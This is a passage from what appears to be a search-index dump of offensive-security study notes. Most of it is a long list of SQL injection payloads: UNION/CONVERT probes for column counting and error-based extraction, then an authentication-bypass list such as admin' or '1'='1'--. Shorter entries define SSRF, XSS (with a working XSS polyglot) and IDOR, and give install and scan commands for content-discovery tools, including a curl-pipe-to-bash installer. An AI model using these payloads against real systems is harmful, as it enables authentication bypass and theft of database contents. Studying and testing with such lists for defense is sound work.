SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#\nUNION ALL SELECT NULL \nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))\nAND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\nAND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))\nAND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)\nAND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)\nUNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX'\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30\nUNION ALL SELECT 'INJ'||'ECT'||'XXX'-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30-- \nUNION ALL SELECT 'INJ'||'ECT'||'XXX'#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#\nUNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#\n</code></pre>"},{"location":"Cyber_Offensive/Web/SQL_Injection/#sql-injection-auth-bypass-payloads","title":"SQL Injection Auth Bypass Payloads","text":"<pre><code>'-'\n' '\n'&amp;'\n'^'\n'*'\n' or ''-'\n' or '' '\n' or ''&amp;'\n' or ''^'\n' or ''*'\n\"-\"\n\" \"\n\"&amp;\"\n\"^\"\n\"*\"\n\" or \"\"-\"\n\" or \"\" \"\n\" or \"\"&amp;\"\n\" or \"\"^\"\n\" or \"\"*\"\nor true--\n\" or true--\n' or true--\n\") or true--\n') or true--\n' or 'x'='x\n') or ('x')=('x\n')) or (('x'))=(('x\n\" or \"x\"=\"x\n\") or (\"x\")=(\"x\n\")) or ((\"x\"))=((\"x\nor 1=1\nor 1=1--\nor 1=1#\nor 1=1/*\nadmin' --\nadmin' #\nadmin'/*\nadmin' or '1'='1\nadmin' or '1'='1'--\nadmin' or '1'='1'#\nadmin' or '1'='1'/*\nadmin'or 1=1 or ''='\nadmin' or 1=1\nadmin' or 1=1--\nadmin' or 1=1#\nadmin' or 1=1/*\nadmin') or ('1'='1\nadmin') or ('1'='1'--\nadmin') or ('1'='1'#\nadmin') or ('1'='1'/*\nadmin') or '1'='1\nadmin') or '1'='1'--\nadmin') or '1'='1'#\nadmin') or '1'='1'/*\n1234 ' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055\nadmin\" --\nadmin\" #\nadmin\"/*\nadmin\" or \"1\"=\"1\nadmin\" or \"1\"=\"1\"--\nadmin\" or \"1\"=\"1\"#\nadmin\" or \"1\"=\"1\"/*\nadmin\"or 1=1 or \"\"=\"\nadmin\" or 1=1\nadmin\" or 1=1--\nadmin\" or 1=1#\nadmin\" or 1=1/*\nadmin\") or (\"1\"=\"1\nadmin\") or (\"1\"=\"1\"--\nadmin\") or (\"1\"=\"1\"#\nadmin\") or (\"1\"=\"1\"/*\nadmin\") or \"1\"=\"1\nadmin\") or \"1\"=\"1\"--\nadmin\") or \"1\"=\"1\"#\nadmin\") or \"1\"=\"1\"/*\n1234 \" AND 1=0 UNION ALL SELECT \"admin\", \"81dc9bdb52d04dc20036dbd8313ed055\n</code></pre>"},{"location":"Cyber_Offensive/Web/SSRF/","title":"SSRF","text":"<p>SSRF (Server Side Request Forgery) - vulnerability that allows user to cause webserver make an extra or edited HTTP request to any resource that attacker wants. There are 2 types of SSRF vulnerability - one is regular, where data is returned to attacker's screen; another type is blind SSRF, in which SSRF occurs but no info is returned to screen.</p> <p>RequestBin</p>"},{"location":"Cyber_Offensive/Web/XSS_%28Cross-Site_Scripting%29/","title":"XSS (Cross-Site Scripting)","text":"<ol> <li>Reflected XSS - user-supplied data in HTTP request is included in webpage source without validation. It can be tested at every point of entry, including parameters in URL and URL file path.</li> <li>Stored XSS - payload is stored on the web app and then gets run when users visit the page. It can be tested at every point of entry where data can be stored, like comments on a blog, user profile information, etc.</li> <li>DOM-Based XSS - JS execution happens directly in browser without loading pages or submitting data. It happens when JS code acts as input or user interaction. Examples can be using the 'window.location.x' parameters for the attacker to gain control, or unsafe methods such as 'eval()'.</li> <li>Blind XSS - similar to stored XSS, but we cannot see the payload working. To test for blind XSS, we need to ensure the payload has a call-back (like a HTTP request) to know if code is getting executed. Tools like <code>xsshunter</code> can be used for blind XSS attacks.</li> <li>XSS polyglot - string of text which can escape attributes, tags and bypass filters all in one. Example - <code>jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\\x3csVg/&lt;sVg/oNloAd=alert('THM')//&gt;\\x3e</code></li> </ol>"},{"location":"Cyber_Offensive/Web/Command_Injection/IDOR/","title":"IDOR","text":"<p>IDOR (Insecure Direct Object Reference) - a type of access control vulnerability; occurs when a web server receives user input to retrieve objects without validation on server-side to confirm the requested object belongs to the one requesting it.</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Cansina/","title":"Cansina","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Cansina/#cansina","title":"Cansina","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Chameleon/","title":"Chameleon","text":"<pre><code>Chameleon - Context-Aware Content Discovery\n[Chameleon](https://github.com/iustin24/chameleon)\n</code></pre> <pre><code>### Commands\n\n##### install\n```shell\ncurl -sL https://raw.githubusercontent.com/iustin24/chameleon/master/install.sh | bash\n```\n##### Tech Scan + Directory Bruteforce:\n```shell\nchameleon --url https://example.com -a\n```\n\n### Config file\n\nChameleon uses the config file located in ~/.config/chameleon/config.yaml.\n\n##### Changing the default wordlists:\n\nIf no wordlist is provided, chameleon will use the wordlist specified in main_wordlist from the config file. ( Default: ~/.config/chameleon/wordlists/raft-medium-words.txt )\n\nWhen detecting technologies with characteristic extensions, chameleon will generate a wordlist by like so ( FUZZ.%ext ). Chameleon will use the wordlist specified in small_wordlist from the config file. ( Default: ~/.config/chameleon/wordlists/raft-medium-words.txt )\n\n##### Changing technology wordlists\n\nExample config.yaml with technology specific wordlists:\n\n```shell\n#Technology Specific Wordlists:\nFlask=\"~/.config/chameleon/wordlists/Flask.txt\"\nJava=\"~/.config/chameleon/wordlists/Java.txt\"\nGo=\"~/.config/chameleon/wordlists/GO.txt\"\n```\n\n##### Adding new technology wordlists\n\nChameleon uses fingerprints from https://github.com/iustin24/wappalyzer/blob/master/apps.json. You can add new technology wordlists by taking the name of a technology from apps.json and adding it to the config file like so:\n```bash\n# Technology Specific Wordlists:\n\n1C-Bitrix=\"~/.config/chameleon/wordlists/new_tech_wordlist.txt\"\n```\n##### Adding new extension fingerprints.\n```bash\n# Technology specific Extensions\n\nMicrosoft_ASP_NET_ext=\"aspx,ashx,asmx,asp\"\nJava_ext=\"jsp\"\nCFML_ext=\"cfm\"\nPython_ext=\"py\"\nPHP_ext=\"php\"\n```\n\n### Switches | Options\n\n```bash\nOPTIONS:\n-a, --tech-detect\n        Automatically detect technologies with wappalyzer and adapt wordlist\n\n-A, --auto-calibrate\n        Automatically calibrate filtering options (default: false)\n\n-c, --mc &lt;MATCHCODE&gt;...\n        Match HTTP status codes from response - Comma separated list [default:\n        200,204,301,302,307,401,403,405]\n\n-C, --fc &lt;FILTERCODE&gt;...\n        Filter HTTP status codes from response - Comma separated list\n\n-h, --help\n        Print help information\n\n-i, --include tech &lt;TECHS&gt;\n        Technology to be included, even if its not detected by wappalyzer. ( -i PHP,IIS )\n\n-J, --json\n        Save the output as json\n\n-k, --config &lt;CONFIG&gt;\n        Config file to use [default: ~/.config/chameleon/config.toml]\n\n-L, --hosts-file &lt;HOSTS_FILE&gt;\n        List of hosts to scan\n\n-o, --output &lt;OUTPUT&gt;\n        Save the output into a file\n\n-s, --ms &lt;MATCHSIZE&gt;...\n        Match HTTP response size. Comma separated list of sizes\n\n-S, --fs &lt;FILTERSIZE&gt;...\n        Filter HTTP response size. Comma separated list of sizes\n\n-t, --concurrency &lt;CONCURRENCY&gt;\n        Number of concurrent threads ( default: 200 ) [default: 40]\n\n-T, --tech url &lt;TECH_URL&gt;\n        URL which will be scanned for technologies. By default, this is the same as '-u',\n        however it can be changed using '-T'\n\n-u, --url &lt;URL&gt;\n        url to scan\n\n-U, --user-agent &lt;USERAGENT&gt;\n        Change the value for the user-agent header [default: \"Chameleon /\n        https://github.com/iustin24/chameleon\"]\n\n-V, --version\n        Print version information\n\n-w, --wordlist &lt;WORDLIST&gt;\n        Main wordlist to use for bruteforcing\n\n-W, --small-wordlist &lt;SMALL_WORDLIST&gt;\n        Wordlist used to generate files by adding extensions ( FUZZ.%ext )\n\n-X, --methods &lt;METHODS&gt;...\n        HTTP Methods to use. Comma separated list of sizes [default: GET]\n```\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/General_Content_Discovery/","title":"General Content Discovery","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/General_Content_Discovery/#we-can-use-the-favicon-link-of-a-website-to-find-the-framework-used","title":"We can use the favicon link of a website to find the framework used","text":"<pre><code>curl https://website.com/favicon.ico | md5sum\n#this calculates md5 hash value after downloading the favicon\n#hash can be used to lookup on &lt;https://wiki.owasp.org/index.php/OWASP_favicon_database&gt;\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/General_Content_Discovery/#manually-discovering-http-headers","title":"Manually discovering HTTP headers","text":"<pre><code>curl http://website.com/ -v\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Katana/","title":"Katana","text":"<p>Katana</p> <p>A next-generation crawling and spidering framework</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Katana/#install","title":"install","text":"<p>Install using go [katana requires Go 1.18 to install successfully]</p> <pre><code>go install github.com/projectdiscovery/katana/cmd/katana@latest\n</code></pre> <p>If you can't use go, you can Install on Ubuntu using the below steps</p> <pre><code>sudo apt update\nsudo snap refresh\nsudo apt install zip curl wget git\nsudo snap install golang --classic\nwget -q -O - https://dl-ssl.google.com/linux/linux_signing_key.pub | sudo apt-key add - \nsudo sh -c 'echo \"deb http://dl.google.com/linux/chrome/deb/ stable main\" &gt;&gt; /etc/apt/sources.list.d/google.list'\nsudo apt update \nsudo apt install google-chrome-stable\n</code></pre>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/","title":"Kiterunner","text":"<p>Kiterunner</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#installation","title":"Installation","text":""},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#downloading-a-release","title":"Downloading a release","text":"<p>You can download a pre-built copy from https://github.com/assetnote/kiterunner/releases.</p>"},{"location":"Cyber_Offensive/Web/Enumeration_%26_Content_Discovery/Directory_Busting/Content_Discovery_Tools/Kiterunner/#building-from-source","title":"Building from source","text":"<pre><code># build the binary\nmake build\n\n# symlink your binary\nln -s $(pwd)/dist/kr /usr/local/bin/kr\n\n# compile the wordlist\n# kr kb compile &lt;input.json&gt; &lt;output.kite&gt;\nkr kb compile routes.json routes.kite\n\n# scan away\nkr scan hosts.txt -w routes.kite -x 20 -j 100 --ignore-length=1053\n</code></pre> <p>The JSON datasets can be found below:</p> <ul> <li>routes-large.json (118MB compressed, 2.6GB decompressed)</li> <li>routes-small.json (14MB compressed, 228MB decompressed)</li> </ul> <p>Alternatively, it is possible to download the compile <code>.kite</code> files 